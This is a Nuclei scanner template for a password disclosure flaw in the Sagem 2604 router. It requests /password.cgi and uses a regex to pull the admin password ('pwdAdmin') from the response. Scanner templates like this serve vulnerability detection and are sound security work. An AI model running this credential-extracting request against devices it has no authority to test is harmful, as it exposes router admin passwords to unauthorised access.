# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: sagem-2604-password-disclosure
info:
  name: Sagem 2604 Password Disclosure Vulnerability
  author: TUNISIAN CYBER
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/password.cgi"

extractors:
  - type: regex
    part: body
    regex:
      - "pwdAdmin = '(.*?)';"
